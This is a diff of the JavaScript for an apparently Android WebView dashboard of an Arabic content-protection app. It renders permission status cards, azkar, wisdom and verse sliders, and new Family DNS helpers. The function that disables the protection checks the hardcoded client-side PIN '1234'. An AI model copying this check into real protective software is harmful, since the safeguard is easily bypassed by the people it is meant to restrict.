             const timerHolder = document.getElementById('countdownTimerHolder');
             if (timerHolder) timerHolder.innerText = "05";
-
             const interval = setInterval(() => {
                 remainingSeconds--;
-                if (timerHolder) {
-                    timerHolder.innerText = remainingSeconds < 10 ? `0${remainingSeconds}` : remainingSeconds;
-                }
-                
-                if (remainingSeconds <= 0) {
-                    clearInterval(interval);
-                    navigateTo('passwordVerify');
-                    logAction("أمن المنظومة", "تم توليد وإصدار رمز التحقق السري بنجاح في نافذة الإدخال.");
-                }
+                if (timerHolder) timerHolder.innerText = remainingSeconds < 10 ? `0${remainingSeconds}` : remainingSeconds;
+                if (remainingSeconds <= 0) { clearInterval(interval); navigateTo('passwordVerify'); logAction("أمن المنظومة", "تم توليد وإصدار رمز التحقق السري بنجاح في نافذة الإدخال."); }
             }, 1000);
         }
 
-        // التحقق النهائي وتنفيذ عملية التعطيل والربط بجسر الحماية
         function verifyAndExecuteDisable() {
             const inputField = document.getElementById('passwordInputField');
             if (!inputField) return;
-
             if (inputField.value === "1234") {
                 triggerAndroidMethod('confirmDisableService', 'إيقاف وتعطيل حماية المحتوى والخدمة الأمنية بالكامل عبر الرمز الموثق');
                 inputField.value = '';
@@ -695,114 +668,57 @@
             }
         }
 
-        // رندرة وتحديث الواجهات الرسومية لبطاقات لوحة التحكم بشكل ناصع
-        function renderSystemStatus() {
+        function renderSystemStatus() { 
             const shield = document.getElementById('statusShieldIcon');
             const mainBtn = document.getElementById('mainServiceBtn');
             const svcText = document.getElementById('serviceStatusText');
             const svcSubText = document.getElementById('serviceSubStatusText');
             const svcIndicator = document.getElementById('serviceStatusIndicator');
-            
             const adminTxt = document.getElementById('adminStatusText');
             const adminCard = document.getElementById('adminStatusCard');
-            
             const battTxt = document.getElementById('batteryStatusText');
             const battCard = document.getElementById('batteryStatusCard');
-            
             const accessTxt = document.getElementById('accessStatusText');
             const accessCard = document.getElementById('accessibilityStatusCard');
-
-            // 1. معالجة حالة الحماية المركزية
             if (systemStatus.service) {
                 if(shield) shield.innerText = "🛡️";
-                if(mainBtn) {
-                    mainBtn.className = "w-full p-6 rounded-2xl glass border-r-4 border-green-500 bg-green-500/10 transition-all duration-300 flex items-center justify-between group neon-border-glow";
-                }
+                if(mainBtn) mainBtn.className = "w-full p-6 rounded-2xl glass border-r-4 border-green-500 bg-green-500/10 transition-all duration-300 flex items-center justify-between group neon-border-glow";
                 if(svcText) svcText.innerText = "حماية المحتوى: نشطة وقوية ✅";
                 if(svcSubText) svcSubText.innerText = "المنظومة تراقب وتمنع الاختراقات ومفسدات المحتوى";
-                if(svcIndicator) {
-                    svcIndicator.innerText = "✓";
-                    svcIndicator.classList.remove('animate-pulse');
-                    svcIndicator.className = "text-green-400 font-black text-xl";
-                }
+                if(svcIndicator) { svcIndicator.innerText = "✓"; svcIndicator.classList.remove('animate-pulse'); svcIndicator.className = "text-green-400 font-black text-xl"; }
                 document.getElementById('protectionRateLabel').innerText = "100%";
             } else {
                 if(shield) shield.innerText = "🔓";
-                if(mainBtn) {
-                    mainBtn.className = "w-full p-6 rounded-2xl glass border-r-4 border-purple-500 transition-all duration-300 flex items-center justify-between group";
-                }
+                if(mainBtn) mainBtn.className = "w-full p-6 rounded-2xl glass border-r-4 border-purple-500 transition-all duration-300 flex items-center justify-between group";
                 if(svcText) svcText.innerText = "تفعيل حماية المحتوى الرقمي";
                 if(svcSubText) svcSubText.innerText = "الخدمة بحاجة إلى صلاحية التشغيل التلقائي";
-                if(svcIndicator) {
-                    svcIndicator.innerText = "✦";
-                    svcIndicator.className = "text-purple-500 animate-pulse text-2xl";
-                }
+                if(svcIndicator) { svcIndicator.innerText = "✦"; svcIndicator.className = "text-purple-500 animate-pulse text-2xl"; }
                 document.getElementById('protectionRateLabel').innerText = "45%";
             }
-
-            // 2. معالجة صلاحية المسؤول (Device Admin)
-            if (systemStatus.admin) {
-                if(adminTxt) adminTxt.innerText = "المشرف نشط ومفعّل ✅";
-                if(adminCard) adminCard.classList.add('border-green-500', 'bg-green-500/5');
-            } else {
-                if(adminTxt) adminTxt.innerText = "غير مفعّل ❌";
-                if(adminCard) adminCard.className = "p-4 rounded-2xl glass border-b border-purple-500/20 text-right transition-all active:scale-95 cursor-pointer";
-            }
-
-            // 3. معالجة تحسين البطارية (Battery Exemption)
-            if (systemStatus.battery) {
-                if(battTxt) battTxt.innerText = "البطارية مستثناة ومؤمنة ✅";
-                if(battCard) battCard.classList.add('border-green-500', 'bg-green-500/5');
-            } else {
-                if(battTxt) battTxt.innerText = "توفير الطاقة نشط";
-                if(battCard) battCard.className = "p-4 rounded-2xl glass border-b border-purple-500/20 text-right transition-all active:scale-95 cursor-pointer";
-            }
-
-            // 4. معالجة صلاحية الوصول (Accessibility)
-            if (systemStatus.accessibility) {
-                if(accessTxt) accessTxt.innerText = "الوصول الذكي نشط ✅";
-                if(accessCard) accessCard.classList.add('border-green-500', 'bg-green-500/5');
-            } else {
-                if(accessTxt) accessTxt.innerText = "انقر لمنح الصلاحية";
-                if(accessCard) accessCard.className = "p-4 rounded-2xl glass border-b border-purple-500/20 text-right transition-all active:scale-95 cursor-pointer";
-            }
+            if (systemStatus.admin) { if(adminTxt) adminTxt.innerText = "المشرف نشط ومفعّل ✅"; if(adminCard) adminCard.classList.add('border-green-500', 'bg-green-500/5'); } 
+            else { if(adminTxt) adminTxt.innerText = "غير مفعّل ❌"; if(adminCard) adminCard.className = "p-4 rounded-2xl glass border-b border-purple-500/20 text-right transition-all active:scale-95 cursor-pointer"; }
+            if (systemStatus.battery) { if(battTxt) battTxt.innerText = "البطارية مستثناة ومؤمنة ✅"; if(battCard) battCard.classList.add('border-green-500', 'bg-green-500/5'); } 
+            else { if(battTxt) battTxt.innerText = "توفير الطاقة نشط"; if(battCard) battCard.className = "p-4 rounded-2xl glass border-b border-purple-500/20 text-right transition-all active:scale-95 cursor-pointer"; }
+            if (systemStatus.accessibility) { if(accessTxt) accessTxt.innerText = "الوصول الذكي نشط ✅"; if(accessCard) accessCard.classList.add('border-green-500', 'bg-green-500/5'); } 
+            else { if(accessTxt) accessTxt.innerText = "انقر لمنح الصلاحية"; if(accessCard) accessCard.className = "p-4 rounded-2xl glass border-b border-purple-500/20 text-right transition-all active:scale-95 cursor-pointer"; }
         }
 
-        // الاستماع الدوري لبث وتحديثات نظام أندرويد عبر الجسر الأصيل
         function initiateSystemStatusLoop() {
             setInterval(() => {
                 if (window.AndroidBridge && window.AndroidBridge.getSystemStatus) {
-                    try {
-                        const nativeStatus = JSON.parse(window.AndroidBridge.getSystemStatus());
-                        // دمج المدخلات والمحافظة الكلية على القيم
-                        systemStatus = { ...systemStatus, ...nativeStatus };
-                        renderSystemStatus();
-                    } catch (e) {
-                        console.error("Error direct processing system status json", e);
-                    }
+                    try { const nativeStatus = JSON.parse(window.AndroidBridge.getSystemStatus()); systemStatus = { ...systemStatus, ...nativeStatus }; renderSystemStatus(); } catch(e) { console.error(e); }
                 }
             }, 2000);
         }
 
-        // بناء وتوليد مكونات الأذكار الفاخرة ديناميكياً لتسريع استجابة الرندرة داخل WebView
         function buildAzkarUiComponent() {
             const container = document.getElementById('azkarCardsContainer');
             if (!container) return;
-
             container.innerHTML = '';
             AZKAR_DATA.forEach((zikr) => {
                 const zikrCard = document.createElement('div');
-                zikrCard.className = 'p-5 rounded-2xl glass border-l-2 border-purple-500/30 text-right transition-all duration-300 hover:bg-purple-950/10';
-                zikrCard.innerHTML = `
-                    <div class="flex justify-between items-center mb-2">
-                        <span class="text-sm font-black text-purple-300">✨ ${zikr.title}</span>
-                        <span id="counterBadge-${zikr.id}" class="text-xs font-mono bg-purple-500/20 border border-purple-500/40 text-purple-200 px-2.5 py-0.5 rounded-full font-bold">التكرار المطلوب: ${zikr.count}</span>
-                    </div>
-                    <p class="text-sm text-gray-200 leading-loose font-medium select-text">${zikr.text}</p>
-                    <button onclick="executeZikrCounterClick(${zikr.id}, ${zikr.count})" id="zikrBtn-${zikr.id}" class="w-full mt-3 py-2 rounded-xl bg-purple-900/20 border border-purple-500/20 text-xs font-bold text-purple-300 transition-all active:bg-purple-500/20">
-                        قمت بالقراءة والتدبر 🤲
-                    </button>
-                `;
+                zikrCard.className = 'p-5 rounded-2xl glass border-l-2 border-purple-500/30 text-right transition-all duration-300 hover:bg-purple-950/10 w-full';
+                zikrCard.innerHTML = `<div class="flex justify-between items-center mb-2"><span class="text-sm font-black text-purple-300">✨ ${zikr.title}</span><span id="counterBadge-${zikr.id}" class="text-xs font-mono bg-purple-500/20 border border-purple-500/40 text-purple-200 px-2.5 py-0.5 rounded-full font-bold">التكرار المطلوب: ${zikr.count}</span></div><p class="text-sm text-gray-200 leading-loose font-medium select-text">${zikr.text}</p><button onclick="executeZikrCounterClick(${zikr.id}, ${zikr.count})" id="zikrBtn-${zikr.id}" class="w-full mt-3 py-2 rounded-xl bg-purple-900/20 border border-purple-500/20 text-xs font-bold text-purple-300 transition-all active:bg-purple-500/20">قمت بالقراءة والتدبر 🤲</button>`;
                 container.appendChild(zikrCard);
             });
         }
@@ -820,117 +736,96 @@
             }
         }
 
-        // بناء وتوليد مكونات الحكم والفوائد المحققة ديناميكياً
         function buildWisdomUiComponent() {
             const container = document.getElementById('wisdomCardsContainer');
             if (!container) return;
-
             container.innerHTML = '';
             WISDOM_DATA.forEach((item) => {
                 const card = document.createElement('div');
-                card.className = 'p-5 rounded-2xl glass border-r-4 border-blue-500/50 text-right transition-all duration-300 shadow-lg';
-                card.innerHTML = `
-                    <p class="text-sm text-gray-100 leading-relaxed mb-3 font-bold select-text">"${item.text}"</p>
-                    <div class="text-xs text-purple-400 font-bold flex items-center gap-1.5">
-                        <span>✦</span> <span>${item.author}</span>
-                    </div>
-                `;
+                card.className = 'p-5 rounded-2xl glass border-r-4 border-blue-500/50 text-right transition-all duration-300 shadow-lg w-full';
+                card.innerHTML = `<p class="text-sm text-gray-100 leading-relaxed mb-3 font-bold select-text">"${item.text}"</p><div class="text-xs text-purple-400 font-bold flex items-center gap-1.5"><span>✦</span> <span>${item.author}</span></div>`;
                 container.appendChild(card);
             });
         }
 
-        // منظومة السلايدر التلقائي الفاخر للآيات القرآنية الكريمة (عاشراً)
-        function startVersesSlider() {
-            stopVersesSlider();
-            renderActiveVerse();
-            
-            verseIntervalId = setInterval(() => {
-                activeVerseIndex = (activeVerseIndex + 1) % VERSES_DATA.length;
-                renderActiveVerse();
-            }, 6000);
-        }
-
-        function stopVersesSlider() {
-            if (verseIntervalId) {
-                clearInterval(verseIntervalId);
-                verseIntervalId = null;
-            }
-        }
-
+        function startVersesSlider() { stopVersesSlider(); renderActiveVerse(); verseIntervalId = setInterval(() => { activeVerseIndex = (activeVerseIndex + 1) % VERSES_DATA.length; renderActiveVerse(); }, 6000); }
+        function stopVersesSlider() { if (verseIntervalId) { clearInterval(verseIntervalId); verseIntervalId = null; } }
         function renderActiveVerse() {
             const content = document.getElementById('sliderVerseContent');
             const surah = document.getElementById('sliderVerseSurah');
             if (!content || !surah) return;
-
-            // إحداث تأثير تلاشي هادئ ومريح
-            content.style.opacity = '0';
-            surah.style.opacity = '0';
-
-            setTimeout(() => {
-                const currentVerse = VERSES_DATA[activeVerseIndex];
-                content.innerText = currentVerse.text;
-                surah.innerText = currentVerse.surah;
-                
-                content.style.opacity = '1';
-                surah.style.opacity = '1';
-                
-                renderSliderDots();
-            }, 300);
+            content.style.opacity = '0'; surah.style.opacity = '0';
+            setTimeout(() => { const currentVerse = VERSES_DATA[activeVerseIndex]; content.innerText = currentVerse.text; surah.innerText = currentVerse.surah; content.style.opacity = '1'; surah.style.opacity = '1'; renderSliderDots(); }, 300);
         }
-
         function renderSliderDots() {
             const container = document.getElementById('sliderDotIndicators');
             if (!container) return;
-
             container.innerHTML = '';
-            VERSES_DATA.forEach((_, idx) => {
-                const dot = document.createElement('div');
-                dot.className = `h-2 rounded-full transition-all duration-300 ${idx === activeVerseIndex ? 'w-6 bg-purple-400' : 'w-2 bg-purple-900'}`;
-                container.appendChild(dot);
-            });
+            VERSES_DATA.forEach((_, idx) => { const dot = document.createElement('div'); dot.className = `h-2 rounded-full transition-all duration-300 ${idx === activeVerseIndex ? 'w-6 bg-purple-400' : 'w-2 bg-purple-900'}`; container.appendChild(dot); });
         }
-
-        // محاكي إخراج تأثير Ripple الفاخر عند النقر على الشاشة لجميع العناصر التفاعلية
         function enablePremiumRippleEffect() {
             document.addEventListener('click', function (e) {
-                const target = e.target.closest('.btn-purple, .glass, button');
+                const target = e.target.closest('.btn-purple, .glass, button, .icon-arrow-btn');
                 if (!target) return;
-
                 const rect = target.getBoundingClientRect();
                 const ripple = document.createElement('span');
                 ripple.className = 'ripple';
-                
                 const size = Math.max(rect.width, rect.height);
                 ripple.style.width = ripple.style.height = `${size}px`;
-                
                 const x = e.clientX - rect.left - size / 2;
                 const y = e.clientY - rect.top - size / 2;
                 ripple.style.left = `${x}px`;
                 ripple.style.top = `${y}px`;
-
                 target.style.position = 'relative';
                 target.appendChild(ripple);
-
-                ripple.addEventListener('animationend', () => {
-                    ripple.remove();
-                });
+                ripple.addEventListener('animationend', () => ripple.remove());
             });
         }
 
-        // بدء تشغيل المنظومة والتهيئة الشاملة فور تحميل الصفحة بالكامل داخل WebView
+        // ===== دوال Family DNS الجديدة =====
+        function showToastMessage(msg) {
+            let existingToast = document.querySelector('.toast-notify');
+            if(existingToast) existingToast.remove();
+            const toast = document.createElement('div');
+            toast.className = 'toast-notify';
+            toast.innerText = msg;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.classList.add('show'), 10);
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 300);
+            }, 2000);
+        }
+
+        function copyDnsToClipboard() {
+            const dnsText = "family.adguard-dns.com";
+            navigator.clipboard.writeText(dnsText).then(() => {
+                showToastMessage("تم نسخ النطاق بنجاح ✅");
+                logAction("Family DNS", "تم نسخ النطاق إلى الحافظة");
+            }).catch(() => {
+                showToastMessage("فشل النسخ، حاول يدوياً");
+            });
+        }
+
+        function openDnsSettingsFromCard() {
+            if (window.AndroidBridge && typeof window.AndroidBridge.openDnsSettings === 'function') {
+                window.AndroidBridge.openDnsSettings();
+                logAction("Family DNS", "تم فتح إعدادات DNS عبر الجسر");
+                showToastMessage("جارٍ فتح إعدادات DNS");
+            } else if (window.AndroidBridge && window.AndroidBridge.openDnsSettings) {
+                window.AndroidBridge.openDnsSettings();
+                logAction("Family DNS", "تم فتح إعدادات DNS");
+            } else {
+                showToastMessage("⚠️ غير متوفر حالياً، يمكن ربطه لاحقاً مع AndroidBridge");
+                logAction("Family DNS", "محاولة فتح إعدادات DNS ولكن الجسر غير موجود");
+            }
+        }
+
         document.addEventListener('DOMContentLoaded', () => {
-            // 1. تفعيل حلقة الاستماع لحالات الأندرويد وجسور الاتصال
             initiateSystemStatusLoop();
-            
-            // 2. بناء المكونات الثابتة والديناميكية لضخامة المشروع
             buildAzkarUiComponent();
             buildWisdomUiComponent();
-            
-            // 3. تمكين تأثيرات اللمس والريبل الفاخرة المخصصة للأجهزة الذكية
             enablePremiumRippleEffect();
-
-            // 4. إرسال إشعار أمني فوري لبدء التشغيل وحفظ التوقيت
-            const now = new Date().toLocaleString('ar-EG');
             document.getElementById('lastLaunchTimeLabel').innerText = new Date().toLocaleTimeString('ar-EG', {hour:'2-digit', minute:'2-digit'});
             logAction("تهيئة النظام", "تم إقلاع الحصن بنجاح وتشغيل محرك التحديثات الفوري v3.0");
         });
